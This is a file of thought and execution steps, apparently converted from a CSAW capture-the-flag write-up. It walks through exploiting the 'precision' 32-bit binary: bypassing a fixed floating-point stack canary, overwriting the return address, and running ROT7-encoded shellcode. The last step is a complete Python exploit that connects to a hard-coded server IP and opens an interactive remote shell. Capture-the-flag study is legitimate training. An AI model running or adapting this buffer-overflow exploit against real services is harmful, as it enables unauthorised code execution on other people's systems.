@@ -1,0 +1,82 @@
+[
+    {
+        "type": "thought",
+        "content": "Precision was an exploit challenge worth 100 points. We're given a binary, and a server that it's running on, and told to exploit it. Let's take a look at the binary."
+    },
+    {
+        "type": "execution",
+        "content": "file precision"
+    },
+    {
+        "type": "thought",
+        "content": "As you can see, it's a 32-bit elf binary using shared libs. Also, it's not stripped, which is nice because it means that named symbols will still be present in the binary (to make reversing easier). Seeing as the goal here is to exploit it, let's take a look at the security controls baked in.\n\n EOF"
+    },
+    {
+        "type": "execution",
+        "content": "checksec.sh --file precision"
+    },
+    {
+        "type": "thought",
+        "content": "No canary, we do have an executable stack, and only partial RELRO. Some of those will also be dependent on the server, but it will not generally get more restrictive than this, only less.\n\n \n\nThe first thing to do with any binary is to play with it. Trying to throw things at it that it might not be expecting, such as non-standard characters, strange combinations of characters, and lots of characters. Here's an example run of the binary:"
+    },
+    {
+        "type": "execution",
+        "content": "./precision"
+    },
+    {
+        "type": "thought",
+        "content": "We can see that it takes in input, then echoes it back. Also note the \"Buff:\". That's the location of your buffer of input. Running it a few times you see that the location changes (as you would expect with Partial RELRO). Again, CSAW challenge writers have made this easier (likely because it's a 100 level problem). If we can overflow the buffer, we don't have to guess where our shellcode is, we know because we are given the address. Also, because the stack is executable, we know we can simply put shellcode at the beginning and execute it.\nOK. So what's the catch? Let's throw something really long at it:"
+    },
+    {
+        "type": "execution",
+        "content": "./precision < AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+    },
+    {
+        "type": "thought",
+        "content": "So if we give it something long, we get a \"Nope\" response. Let's see where that is. You can find where this happens in any number of ways. I backtracked using IDA Pro, but you can use any number of disassemblers. Just for fun, here's a completely free way to determine where this happened just using ltrace and grep!"
+    },
+    {
+        "type": "execution",
+        "content": "ltrace -C -f -n 5 -s 512 -S -i ./precision 2>&1 | grep Nope"
+    },
+    {
+        "type": "thought",
+        "content": "OK. So we now know that Nope is being sent at 0x80485b5. Let's take a peek at why we're hitting the \"Nope\". "
+    },
+    {
+        "type": "execution",
+        "content": "r2 -A precision"
+    },
+    {
+        "type": "thought",
+        "content": "Notice the fld, fucomip, and fstp calls. Basically, what these are doing are pulling a floating point value from the stack, and comparing it with a value that's in the .rodata section. Let's take a full look at the first section. Note what I have highlighted. Those two commands (fld followed by fstp) tell your machine to load a floating point from the that segment, then store it onto the stack. Then, after getting input, it compares if that floating point value on the stack is still the same as the one in the other segment. If it is, then all is well and you can continue. If not, you get a \"Nope\" return. For those familiar with exploit mitigations, this is the same concept as a stack canary. The problem is, stack canaries need to be random every time, or else the attacker can just overwrite the canary with the known value. Since this floating point stack canary isn't random, we do just that for execution. Being lazy, I'm just going to grab the floating point values directly from memory instead of calculating out what they should be. I'll do this with gdb and setting a break point just after the floating point value is set."
+    },
+    {
+        "type": "execution",
+        "content": "gdb ./precision"
+    },
+    {
+        "type": "thought",
+        "content": "Ok. So we have our values now. We will need to ensure those two hex words don't change when we overwrite. Next, we need to know the proper offset for the canary overwrite. Without going into detail, this can be done by just trying out different amounts. Turns out the magic number is 128 characters. Using this, let's verify that we have a correct overwrite while keeping the canary alive."
+    },
+    {
+        "type": "execution",
+        "content": "python -c 'from struct import pack; print(b\"A\"*128 + pack(\"<I\",0x475A31A5) + pack(\"<I\",0x40501555) + b\"BBBBB\")'"
+    },
+    {
+        "type": "thought",
+        "content": "Again, any number of ways to do this. We'll just use echo."
+    },
+    {
+        "type": "execution",
+        "content": "echo -e \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\\xa51ZGU\\x15P@BBBBB\" | ./precision"
+    },
+    {
+        "type": "thought",
+        "content": "Awesome. Our overwrite worked. The floating point canary check passed, and we've put more data in the buffer than we were supposed to without it getting upset. Now we just discover where the return value overwrite it (as I've shown many times previously with pattern.py or other scripts). Turns out it's 12 characters past the floating point check. Throw some shellcode into the beginning of the buffer, read in the buffer address before throwing, and exploit it.\n\n \n\nHere's my exploit python code. The only gotcha here is that 0xa, 0xb, and 0x0 are all bad characters. Generally speaking, it's easy enough to find shellcode that gets past 0xa, but for some reason a lot of shellcode will have 0xb. I've found the ROT 7 encoded shellcode to be pretty reliable. I also use telnetlib for my exploits since it allows me to go interactive after exploitation very easily."
+    },
+    {
+        "type": "execution",
+        "content": "#!/usr/bin/python3 -u\n\nfrom telnetlib import Telnet\nfrom struct import pack\n\nhost = \"54.173.98.115\"\nport = 1259\n\ndef connect():\n        global tn\n        tn = Telnet(host,port)\n\ndef readBufAddr():\n        s = tn.read_until(b\"Buff: \")\n        s = tn.read_until(b\"\\n\")\n        return int(s,16)\n\nconnect()\n\nbufAddr = readBufAddr()\n\nprint(\"Buf is at {0}\".format(hex(bufAddr)))\n\n# ROT7 shellcode so no \"0b\" and no \"0a\"\nshellcode = b\"\\xeb\\x16\\x5e\\x8a\\x06\\x31\\xc9\\x8a\\x5c\\x0e\\x01\\x80\\xeb\\x07\\x88\\x1c\\x0e\\x41\\x38\\xc8\\x75\\xf1\\xeb\\x05\\xe8\\xe5\\xff\\xff\\xff\\x18\\x38\\xc7\\x57\\x6f\\x36\\x36\\x7a\\x6f\\x6f\\x36\\x69\\x70\\x75\\x90\\xea\\x38\\xd0\\x90\\xd1\\x71\\x12\\x5f\\xd4\\x87\"\n\n# Here's the exploit line\nexploit = shellcode + b\"A\"*(128-len(shellcode)) + pack(\"<I\",0x475A31A5) + pack(\"<I\",0x40501555) + b\"A\"*12 + pack(\"<I\",bufAddr)\n\nprint(exploit)\n\ntn.write(exploit + b\"\\n\")\n\no = tn.read_until(b\":::\",0.5)\n\ntn.interact()"
+    }
+]
